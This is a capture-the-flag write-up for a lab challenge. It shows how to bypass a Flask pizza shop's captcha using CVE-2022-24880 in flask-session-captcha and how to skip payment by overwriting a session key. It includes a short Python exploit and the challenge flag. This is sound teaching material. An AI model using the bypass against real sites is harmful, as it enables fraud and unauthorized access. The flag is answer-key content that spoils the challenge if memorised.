# Pizza Order
![date](https://img.shields.io/badge/date-24.01.2023-brightgreen.svg) 

## Challenge
Bad news, the local pizza dealer has implemented some sort of new captcha mechanism which seems impossible to solve, can you help us order pizza?

http://10.212.138.23:48575

Flag format: S2G{...}

## Solution
The website is a Flask application that lets users order pizza. However, the captcha is impossible to read, and hence, ordering pizza becomes impossible. So to solve this challange we need to bypass both captcha and payment.

The application is using flask-session-captcha version 1.2.0. This version has a captcha validate bypass vulnerability, [CVE-2022-24880](https://github.com/advisories/GHSA-7r87-cj48-wj45).

The function `captcha.validate()` returns `None` if no value was passed. Since the challange checks `captcha.validate() == False`, the user could send a request with an empty form to bypass it.

Secondly, we want `if session['user_type'] == 'private':` to be false. That means we need to change the value of `session['user_type']` to something else. The user can set the cardholder-field to `user_type`, which will overwrite the previous value, and the website will spit out the flag.
```python
session[request.form.get('cardholder')] = {'card-number':request.form.get('cardNumber'),'expiration-date':request.form.get('expirationDate'), 'cvv':request.form.get('cvv')}
```
**Flag:** S2G{d41d8cd98f00b204e9800}

### Python
We need to specify the session cookie to validate the captcha, else we will recieve "Invalid captcha".

See [exploit.py](./exploit.py).
```python
import requests
import re

url = "http://10.212.138.23:48575"
headers = {
    "Cookie": "session=anything",
}

payload = {
    "cardholder": "user_type",
}

response = requests.post(url, headers=headers, data=payload)

pattern = re.search("S2G", response.text)
flag = pattern.group() + response.text[pattern.end():pattern.end()+24].strip()

print(flag)
```
